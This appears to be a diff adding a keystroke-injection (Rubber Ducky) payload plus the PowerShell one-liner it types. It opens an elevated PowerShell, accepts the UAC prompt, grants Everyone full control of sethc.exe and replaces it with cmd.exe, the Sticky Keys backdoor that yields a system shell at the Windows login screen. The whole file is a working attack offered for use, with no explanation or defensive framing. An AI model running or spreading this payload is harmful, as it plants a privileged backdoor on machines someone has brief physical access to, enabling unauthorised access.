@@ -1,0 +1,16 @@
+copy c:\windows\system32\sethc.exe c:\;$acl = Get-Acl c:\windows\system32\sethc.exe;$AccessRule1 = New-Object System.Security.AccessControl.FileSystemAccessRule("Jeder","FullControl","Allow");$AccessRule2 = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","Allow");$acl.SetAccessRule($AccessRule1);$acl | Set-Acl c:\windows\system32\sethc.exe;$acl.SetAccessRule($AccessRule2);$acl | Set-Acl c:\windows\system32\sethc.exe;Copy-Item -Path c:\windows\system32\cmd.exe -Destination c:\windows\system32\sethc.exe -Recurse -force; exit
+
+
+----------------------------------------------------------------------------------------------------------------------
+
+DELAY 1500
+GUI r
+DELAY 1000
+STRING Powershell
+DELAY 400
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 800
+STRING copy c:\windows\system32\sethc.exe c:\;$acl = Get-Acl c:\windows\system32\sethc.exe;$AccessRule1 = New-Object System.Security.AccessControl.FileSystemAccessRule("Jeder","FullControl","Allow");$AccessRule2 = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","Allow");$acl.SetAccessRule($AccessRule1);$acl | Set-Acl c:\windows\system32\sethc.exe;$acl.SetAccessRule($AccessRule2);$acl | Set-Acl c:\windows\system32\sethc.exe;Copy-Item -Path c:\windows\system32\cmd.exe -Destination c:\windows\system32\sethc.exe -Recurse -force; exit
+ENTER
